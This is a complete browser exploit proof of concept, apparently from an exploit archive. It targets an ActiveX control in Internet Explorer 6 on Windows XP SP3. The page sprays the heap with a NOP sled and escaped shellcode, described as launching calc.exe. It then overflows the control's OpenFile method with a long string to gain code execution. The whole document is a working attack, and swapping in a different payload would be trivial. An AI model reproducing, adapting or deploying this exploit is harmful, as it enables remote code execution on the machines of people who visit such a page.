// Tested on XP3 Pro with IE6
// Shellcode is windows/exec cmd='calc.exe'

<html>
    <object id = "crash" classid = "clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687"></object>
    <script language = 'javascript'>
        
	shellcode = unescape('%uc2db%u74d9%uf424%u82b8%u4762%u5eb9%uc92b%u31b1%uc683%u3104%u1446%u4603%u8096%u45b2%uc67e%ub63d%ua77e%u53b4%ue74f%u10a3%ud7ff%u75a0%u9cf3%u6de5%ud180%u8121%u5f21%uac14%uccb2%uaf64%u0f30%u0fb9%uc009%u4ecc%u3d4e%u023c%u4907%ub393%u072c%u3f28%u897e%udc28%ua836%u7319%uf34d%u75b9%u8f82%u6df3%uaac7%u054a%u4033%ucf4d%ua90a%u2ee2%u58a3%u77fa%u8303%u8189%u3e70%u558a%ue40b%u4e1f%u6fab%uaa87%ua34a%u385e%u0840%u6614%u8f44%u1cf9%u0470%uf2fc%u5ef1%ud6db%u045a%u4e42%ueb06%u907b%u54e9%udade%u8007%u8153%u574d%ubfe1%u5723%ubff9%u3013%u34c8%u47fc%u9ed5%ub8b9%u839f%u50eb%u5646%u3cae%u8c79%u38ec%u25fa%ube8c%u4fe2%ufb89%ubca4%u94e3%uc340%u9450%ua040%u0637%u0908%uaed2%u55ab');

        nops = unescape('%u9090%u9090');

        headersize = 20;

        slack = headersize + shellcode.length;

        while (nops.length < slack)
        {
        nops += nops;
        }

        filler = nops.substring(0, slack);

        chunk = nops.substring(0, nops.length - slack);

        while (chunk.length + slack < 0x40000) 
        {
        chunk = chunk + chunk + filler;
        }

        heap = new Array();

        for (i = 0; i < 500; i++)
        {
        heap[i] = chunk + shellcode;
        }

        alert("Heap Spray Done");


        address = '';
        for (i = 0; i <= 1000; i++) 
        {
            address += unescape("%06");
        }
        
        crash.OpenFile(address);

    </script>
</html>
